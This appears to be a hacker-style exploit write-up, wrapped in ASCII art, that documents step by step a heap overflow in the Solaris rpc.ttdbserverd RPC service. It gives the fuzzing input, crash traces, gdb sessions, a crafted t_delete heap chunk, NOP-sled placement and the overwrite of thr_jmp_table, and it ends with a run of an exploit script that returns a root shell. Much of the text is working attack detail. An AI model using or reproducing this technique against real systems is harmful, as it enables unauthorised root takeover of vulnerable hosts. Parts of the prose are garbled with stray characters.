@@ -1,0 +1,313 @@
+"//"/////"/"/"/-""/"/""""/?OS@@@@@@@@@@@@@@@@@@@#$O=/-;'-;;;;;;;-;"/+===+//""""
+;-;;-;---;-;;;-;---"-""??O8@@@@@@@@@@@@@@@@@@@@@@@8I"-;:;':'''''';-/+==?/""-"--
+'''''''''''''''.;-/*O@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8X";'::::::'';"/???/"--;--;
+''::''''''':':':;/I@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@O=-;::':''';;-;---;;;;---
+''''''''''''''''O@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#I?''''''';;-";;;;;;;;;
+'''''''''''''-/N@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8O";;;;;;;;;;;;;;;---
+'''''''''''"I@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8+";;;;;;;;;------
+''''''''''"O@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@O*";;';;;;;------
+'''''''''-O@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#O?";;----"""""
+'''''''-=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@S/"-//??/""""
+'''''''$@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@S=/????/"---
+'''''-I@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@NX+???/""---
+''''-X@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#X=??//""""
+''''?N@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@UI??/"""""
+'''/S@@@@@$*IIO8#ON@@@@@@@@@@@@@@@@@@@@@@@@@@@@@$N@@@@@@@@@@@@@@@@@@@@S?"-----"
+'''/$@@@@#S*I$$88OON@@@@@@@@@@@@@@@@@@@@@@@@@@@NON@@@@@@@@@@@@@@@@@@@@$="------
+:::/#@@NOZ@@@@@@$N8SOSN#@@@@@@@@@@@@@@@##N@@@@@NN@@@@@@@@@@@@@@@@@@@@@@@**";---
+:::"$@@S*#@@@@@@@@@8OOSSN$@@@###@@@@##@$O$NNN@@@@@@@@@@@@@@@@@@@@@@@@@@@@*";---
+:::/#@@OS@@@@@@@@@@@@@8OO=IOON$$8N@N$#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@S?'';;
+:::=@@@8$@@@@@@@@@@@@@@@N$8$S###$8@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@NI;'';
+:::O@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*;'';
+::-N@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@O-'';
+:'+@@@@@@#O/=8@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8/;';
+:'*@@@@@@NO/;-*?O=="OX@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@N+;;-
+::S@@@@@@NO"'...::..:::.:.../;==8I$I=/OINO@*X=N8@N@####N#####@@@@@@@@@@@@@@S?""
+:"O@@@@@@N*-'..........:....:.:.;'''::'';'"";;-""+/OXNN#N#####@@@@@@@@@@@@@8?--
+-8@@@@@@@8?:;ISI':.....:...............'..'';-"-;""/=O8N@@@@##@@@@@@@@@@@@@X";;
+-$@##@@@@S-:'"S$*I;;:'.........:.:...':::';;-';--/?*X$#@@@@@#N@@@@@@@@@@@@@O=-;
+:O@N$@@@#?..'-"-OO@N$NSS?/......'...::':'':--=IO$@@@@@@@@@#$###@@@@@@@@@@@@@@O/
+:I@@N@@@$-:;---""==$@@@$8O//;"....''.::'':=**NN@@@@@@@@@@##8N##@@@@@@@@@@@@@@$?
+:'IN##@@X:.;?+?/++OSN#@@@@@@@S-:..'..-?OSNN@@@@@@@@@@@@@@@@NO$##@@@@@@@@@@@@@N?
+'..."S@N?.:;-?SN@@@@@@@@@@SS.... ..:-O@@#@@@@@@@@@@@@@@@@@#NS8#@@@@@@@@@@@@#*'
+     I@$"..';+#@@O+@@@@@@@S" .... . "8@@@@@@@@@@@@@@@@@@@@@#8S$@@@@@@@@@@@@@$?.
+::/S@#@#I..-/=+I$$@@@@@@@@@@$=.....''?ON##@@@@@@@@@@@@@#@@@#8O##@@@@@@@@@@@@@$
++/ -'?N8; .:;+;::?==XX*+;; ....  ..:"$@@@@@@@@@O?I@8ON@@@@#N$OX$@@@@@@@@@@@$///
+;"+="/8X  ..''...''";/'"";          "O@@@@@@@S*?IOOOON@@@@@#NS*O@@@@@@@@@@#I/;/
+.;;'?I$? ......  ..'; --    .......'/O@@@@@@@?';-"/=**SO$SS8##$OX$@@@@@@@#"I//;
+.';::?N+  .....  ..'';-;  ........::+$@@@@@@@I:'-"/=**SO$SS8##$OX$@@@@@@@#/:;;/
+.'-'+$*   .  .  ..';"-;  ......  :/S######@@@='.'-"-"?+IIO8N#8OO8@@@@NN8=///;;/
+.'-';-*S   .  .    ';-'   ....    '+8#NN####@@O".:--"/??IIS$N#8OO$@@@@8$O?=::/
+.';::-'I?... .....'''    ....     :?8@##NNNN@@NX-;;;;;-+*OO8NN@@@@@@@N8S+//-/:;
+.;;:"I;++::: ....'.::    ....     :"S@@#N$N#@@#S/;''';"+*S8$N$@@@@@@@@#NO/;:;/
+.'; '"-'";''' :......  ......     .-O#@@NN8N@@@8+;;-'/X8888$N$@@@@@@@@#O?:://
+.'' .:;.';'.'':......  .....      .;XN@@P#N#@@@$I"--"*888$8$N$@@@@@@@@#O:/::/
+.:' .   ::'':::'......  ... /='. .:=8@####N@@@@@8*?++*XO$N$N$$@@@@@@@@N;0;::
+.::'...;:'':::'......  ... *@@=;'?"S#@@@#N@@@@@@#O*I*S8$NNNNNN@@@@@@@@;;/::
+. :;'...;-':::.......... . .-/?;*#@@@@@@@@@@@@@@@@N$8#NN@#NNNN@@@@@@@;;;;;;
+.. :'-.:+S=':::....... .. . .::':'/@@@@@@@@@@@@@@@@@@$N#N#N#NNN@@@@@   ;:;
+   :'+';-;'':...  ..           ..:-=O@@@@@#N#@@@#N$$$$8$8$$$$$ON##O;;; ;;;
+	 ';'::..... :;:       ...:'"/+SO@@@##N#@@NN$$$$888$$N$8S8$N::::;
+	   '::......':   . .::::';--;?XOO*OONNN#@#$$$88888$$N$8"/.:::;
+	   '::......:.   :..:::::';;-+XOOOXXS8$N@#N$$8$$$88$$$$O':::
+	   '::......:....:. .   ... :"IOSOO88N$NNN$$$$$$$N$$$$*
+	    '::::...:..::. . ;'/.. .'*IOSSO$$NNNN#8$$$N$$$$N$$=
+	    ;':::...:-/X+SO@#@@@##$@@@@@8$88NNNNN#N$$$$$N$$$$8?
+	     ':::. .'/II*"O"+-?SX@N@@@@@@@#$NN#NN#N$$$$$$$N$88?
+	     '::::::'--::''''...:'''/?OO$$@@@@@@@@$$$$$$$$$8$$?
+	      ;':::''-;:::;/+X?*/+-??**O8NN#N#@@@@$$$$$$$88NN$?
+	       ;':::';;;;;-/?IOO#N@@@@@@@@#####@@8$N$N$$$8N##$=
+===============;;'''''';;"/??+*IX+XX$#@@@@#@##@@@$$NNNN$$N#@@NI================
+================;;'''''''';;;;--//??*X8N@@@@@@@@@@@##NNN#@@@@#O================
+=================;;'''''''';':':;;-;"/**O8@N@#@@@@@##NN#@@@@@@8":==============
+================== ;;;;'::::::::';;';"/+II=+//O8NNN$@@@@@@@@@$**NS=============
+===================;;;;':::'''';;--;;/??IX**IXON##N##@@@@@@@@#NXI#NS"==========
+====================;;;+""-""/"////?+***XOOSON#N@@@@@@@@@@@@@#N8S@@@?==========
+=====================;"?++/++I===I=XXOXXXSO$$#NN@@@@@@@@@@@@@##@#@@@8==========
+=================?;''''''+8N8#$#N#N@N#$NN###N#@@@@@@@@@###@@@@@@@@@@@@O========
+=============. -O/'::':';+S@@@@@@@@@@@@@###@@@@@@@@@@#N#@@@@@@@@@@@@@@#O*-=====
+============...?#S".:''';-?/8#8@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@$=====
+===============================================================================
+=====================================SPOCK=====================================
+*******************************************************************************
+       ________________
+      /                \
+     / /          \ \   \          http://www.kernelhacking.com/
+     |                  |          http://twitter.com/bsdaemon
+    /                  /           rodrigo@kernelhacking.com
+   |      ___\ \| | / /                
+   |      /           |
+   |      |     __    |
+  /       |       \   |
+  |       |        \  |              "HEH HEH HEH !!!!!"
+  |       |       __  |            /
+  |      __\     (_o) |           /
+  |     |             |
+   \    ||             \
+    |   |__             \
+    |   |           (*___\
+    |   |       _     |
+    |   |    //_______|
+    |  /       |_|_|_|___/\
+     \|       \ -         |
+      |       _----_______/ 
+      |      /
+      |_____/
+******************************************************************************
+
+
+
+Abstratct
+
+
+This article main purpose, explain how to exploit the vulnerability of TTDB server. It is worth mentioning that this vulnerability affects Unix systems in general.
+
+
+Step by step:
+
+Fisrt step was find in which port the ttdb server had been running:
+
+bash-3.00# rpcinfo -p localhost | grep 100083
+    100083    1   tcp  32777
+
+After that we apply a telnet localhost 32777 to climb the process.
+
+bash-3.00# telnet localhost 32777
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+asdf
+Connection to localhost closed by foreign host.
+
+Then get the PID of the process TTDB:
+
+bash-3.00# ps -fed | grep ttdb
+    root  1534   202   0 15:03:47 ?           0:00 /usr/dt/bin/rpc.ttdbserverd
+
+Run the truss command to check the calls made through the TTDB:
+
+bash-3.00# truss -eaf -p 1534
+1534:   psargs: /usr/dt/bin/rpc.ttdbserverd
+1534:   pollsys(0xFFBFDC80, 1, 0x00000000, 0x00000000) (sleeping...)
+
+
+Done it in another machine ran a fuzzer RPC, pointing to procedure 7, with the string FOLLOW-THE-WHITE-RABBIT, the truss pointed the following output:
+
+1534:   pollsys(0xFFBFDC80, 2, 0x00000000, 0x00000000)  = 1
+1534:   fstat(256, 0xFFBFF910)                          = 0
+1534:   getmsg(256, 0xFFBFFA7C, 0xFFBFFA6C, 0xFFBFFA8C) = 0
+1534:   open64("FOLLOW-THE-WHITE-RABBIT.rec", O_RDWR)   Err#2 ENOENT
+1534:   open64("FOLLOW-THE-WHITE-RABBIT.rec", O_RDONLY) Err#2 ENOENT
+
+The program TTDB tried to open a file called FOLLOW-THE-WHITE-RABBIT.rec. That is, he used our input and added. "Rec" as a safety measure to not access other
+files. After that, I checked the directories looking for files ending in. Rec:
+
+bash-3.00# find . -name *.rec -print
+./TT_DB/file_table.rec
+./TT_DB/file_object_map.rec
+./TT_DB/property_table.rec
+./TT_DB/access_table.rec
+
+After the files found. Rec, I generated files. Rec modified,After testing, the generated file with the decimal position 233 changes, the following crash
+occurred:
+
+1534:   fstat(256, 0xFFBFF910)                          = 0
+1534:   getmsg(256, 0xFFBFFA7C, 0xFFBFFA6C, 0xFFBFFA8C) = 0
+1534:   open64("/tmp/access_table.off-000233.rec", O_RDWR) = 4
+1534:   fstat64(4, 0xFFBFF5E8)                          = 0
+1534:   fcntl(4, F_SETFD, 0x00000001)                   = 0
+1534:   open64("/tmp/access_table.off-000233.ind", O_RDWR) Err#2 ENOENT
+1534:   open64("/tmp/access_table.off-000233.var", O_RDWR) Err#2 ENOENT
+1534:   llseek(4, 0, SEEK_SET)                          = 0
+1534:   read(4, " N e t I S A M\0", 8)                  = 8
+1534:   llseek(4, 0, SEEK_SET)                          = 0
+1534:   read(4, " N e t I S A M\0 U n k n".., 1024)     = 1024
+1534:   read(4, " A A A A A A A A A A A A".., 1024)     = 1024
+1534:   fstat64(4, 0xFFBFEF70)                          = 0
+1534:   open64("/tmp/access_table.off-000233.ind", O_RDWR) Err#2 ENOENT
+1534:       Incurred fault #5, FLTACCESS  %pc = 0xFF0D2544
+1534:         siginfo: SIGBUS BUS_ADRALN addr=0x41414141
+1534:       Received signal #10, SIGBUS [default]
+1534:         siginfo: SIGBUS BUS_ADRALN addr=0x41414141
+
+Analyzing via gdb:
+
+bash-3.00# /opt/sfw/bin/gdb -c /core /usr/dt/bin/rpc.ttdbserverd
+GNU gdb 6.2.1
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "sparc-sun-solaris2.10"...(no debugging symbols found)...
+Core was generated by `/usr/dt/bin/rpc.ttdbserverd'.
+Program terminated with signal 10, Bus error.
+....
+....
+....
+#0  0xff0d1ec4 in _malloc_unlocked () from /lib/libc.so.1
+(gdb) bt
+#0  0xff0d1ec4 in _malloc_unlocked () from /lib/libc.so.1
+#1  0xff0d1d4c in malloc () from /lib/libc.so.1
+#2  0x0003bec4 in _make_isfname ()
+#3  0x0003a9f8 in _open2_indfile ()
+#4  0x0003a668 in _isfcb_cntlpg_r ()
+#5  0x00035104 in _openfcb ()
+#6  0x00034ec0 in _amopen ()
+#7  0x00034e58 in _am_open ()
+#8  0x00034df0 in isopen ()
+#9  0x00035f00 in iserase ()
+#10 0x0002a1c0 in __0FN_tt_iserase_1PPcP6J__svcxprt ()
+#11 0x00026370 in __0FT_tt_dbserver_prog_1P6Hsvc_reqP6J__svcxprt ()
+#12 0xff1cec40 in _svc_prog_dispatch () from /lib/libnsl.so.1
+#13 0xff1cea1c in svc_getreq_common () from /lib/libnsl.so.1
+#14 0xff1ce858 in svc_getreqset () from /lib/libnsl.so.1
+#15 0x00025114 in main ()
+(gdb) x/i $pc
+0xff0d1ec4 <_malloc_unlocked+356>:      ld  [ %l2 ], %l4
+(gdb) i r $l2
+l2             0x41414141       1094795585
+
+
+Apparently a heap overflow occurred, overwriting the heap structures.
+After that, I checked the position in the generated file that pointed to register $ l2.
+Considering that ж a heap overflow in solaris, I used the techniques known t_delete generating a heap block below:
+
+"\x00\x00\x00\x00". // Size
+"\xff\xff\xff\xff". // Not important, any value
+$pstck.             // What I write
+"\x00\x00\x00\x00". // Not important, any value
+"\xff\xff\xff\xff". // -1,to enter the t delete, compulsory
+"\xff\xff\xff\xff". // any value
+$pnull.             // Address pointing to Null, this bug only mandatory!!!
+"\xff\x00\x00\x00". // any value
+$pheap.             // I am going write here -8
+
+After several tests, it was necessary to point out the $ pnull to an area of memory that contains
+NULLs because after writing the program still crash trying to access areas outlined
+by $ pheap, after detalhas analysis, I noticed that the $ pnull was the cause of the problems.
+
+After with this chunk created by imputing values ​​at $ 0x61626364 0x41424344 pstck and the $ pheap
+The following result was obtained:
+
+#0  0xff0c766c in t_delete () from /usr/lib/libc.so.1
+(gdb) x/i $pc
+0xff0c766c <t_delete+52>:       st  %o0, [ %o1 + 8 ]
+(gdb) i r $o0
+o0             0x61626364       1633837924
+(gdb) i r $o1
+o1             0x41424344       1094861636
+
+We reached the technique successfully delete t where we can write 4 bytes pointed to by
+$ o0 register for the contents of the register $o1 + 8.
+
+After it was necessary to find a place to put our shellcode and a place to
+overwrite in memory and gain control of the process.
+
+Since the file. Was not rec enabling espaуo to insert the shellcode and NOPs of
+satisfactory way, I decided to send in the same procedure TTDB 7, apзs the "path to
+the file. rec "NOPs 8192 as the second argument of the RPC call.
+
+After upgrading the crash again with this measure, I NOP blocks in memory heap:
+
+0x885b0:        0x00002329      0x00000000      0x80000098      0x1938ba51
+0x885c0:        0x00000000      0x00000002      0x000186f3      0x00000001
+0x885d0:        0x00000007      0x00000001      0x00000020      0x4b3b6340
+0x885e0:        0x00000009      0x6c6f6361      0x6c686f73      0x74000000
+0x885f0:        0x00000000      0x00000000      0x00000000      0x00000000
+0x88600:        0x00000000      0x0000000a      0x2f746d70      0x2f6f776e
+---Type <return> to continue, or q <return> to quit---
+0x88610:        0x65640000      0x00000020      0x00616161      0x10800003
+0x88620:        0x10800003      0x10800003      0x10800003      0x10800003
+0x88630:        0x10800003      0x10800003      0x10800003      0x10800003
+0x88640:        0x10800003      0x10800003      0x10800003      0x10800003
+0x88650:        0x10800003      0x10800003      0x10800003      0x10800003
+0x88660:        0x10800003      0x10800003      0x10800003      0x10800003
+0x88670:        0x10800003      0x10800003      0x10800003      0x10800003
+0x88680:        0x10800003      0x10800003      0x10800003      0x10800003
+0x88690:        0x10800003      0x10800003      0x10800003      0x10800003
+
+
+Above we have the package rpc in our area heap containing NOPs.
+
+So we already have the address of $ pstck now finding fault where we can write.
+After research, I found the possibility of using this address thr_jmp_table
+in library / lib/ld.so.1 as many papers and previous exploits used.
+╔ possible to remove the address from the command line thr_jmp_table:
+
+bash-3.00# /usr/ccs/bin/dump -t /lib/ld.so.1 | grep thr_jmp_table
+[572]    0x3c268     28       1         0       0       0xf     thr_jmp_table
+
+We address 0x3c268, added to the base / lib/ld.so.1, which can be found through
+command:
+
+bash-3.00# pmap /core
+core '/core' of 1570:   /usr/dt/bin/rpc.ttdbserverd
+00010000     216K r-x--  /usr/openwin/bin/rpc.ttdbserverd
+00054000      24K rwx--  /usr/openwin/bin/rpc.ttdbserverd
+0005A000     216K rwx--    [ heap ]
+...
+...
+...
+FF3B0000     176K r-x--  /lib/ld.so.1
+
+With the base found 0xFF3B0000 + = 0x3c268 0xff3ec268 find the address of
+thr_jmp_table, and this 0xFF3B0000 not base ranges from versions of solaris.
+
+With this we have all the information necessary to exploit the vulnerability.
+
+bash-3.00# perl final.pl -o 8192
+-= rpc.ttdbserverd .rec parser exploit for solaris 9/10 sparc =-
+   Usage: [-f] /file/name [-h] hostname [-o] offset
+[+] Creating file /tmp/owned.rec
+[+] Writing 0x89080 to 0xff3ec268
+[+] TTDB running on port 32777
+[+] Sending stuff to TTDB ...d0ne!
+[+] Wait a little!
+[*] We got in =)
+
+SunOS mordor 5.10 Generic sun4u sparc SUNW,Ultra-5_10
+uid=0(root) gid=0(root)
+
+
+ w00t!!! 
